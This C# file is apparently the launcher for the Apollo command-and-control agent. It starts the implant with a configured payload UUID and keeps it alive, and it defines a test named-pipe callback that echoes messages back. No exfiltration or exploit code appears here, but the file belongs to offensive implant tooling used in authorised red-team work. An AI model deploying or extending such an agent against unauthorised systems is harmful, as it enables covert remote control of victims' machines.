using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;

namespace Apollo
{
    class Program
    {
        static void Main(string[] args)
        {
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
            while(ap.IsAlive())
            {
                System.Threading.Thread.Sleep(1000);
            }
        }
    }

    public class DummyCallback : INamedPipeCallback
    {
        public void OnAsyncConnect(PipeStream pipe, out Object state)
        {
            Console.WriteLine("Connected");
            state = null;
        }

        public void OnAsyncDisconnect(PipeStream pipe, Object state)
        {
            Console.WriteLine("Disconnected :'(");
        }
        public void OnAsyncMessageReceived(PipeStream pipe, IPCData data, Object state)
        {
            string s = Encoding.UTF8.GetString(data.Data, 0, data.DataLength);
            Console.WriteLine($"received a message! {Encoding.UTF8.GetString(data.Data, 0, data.DataLength).Trim()}");
            s += " server reply!";
            byte[] d = Encoding.UTF8.GetBytes(s);
            pipe.BeginWrite(d, 0, d.Length, OnAsyncWriteComplete, pipe);
        }
        public void OnAsyncMessageSent(PipeStream pipe, IPCData data, Object state)
        {
            Console.WriteLine("Sent a message!");
        }

        public void OnAsyncWriteComplete(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
        }
    }
}
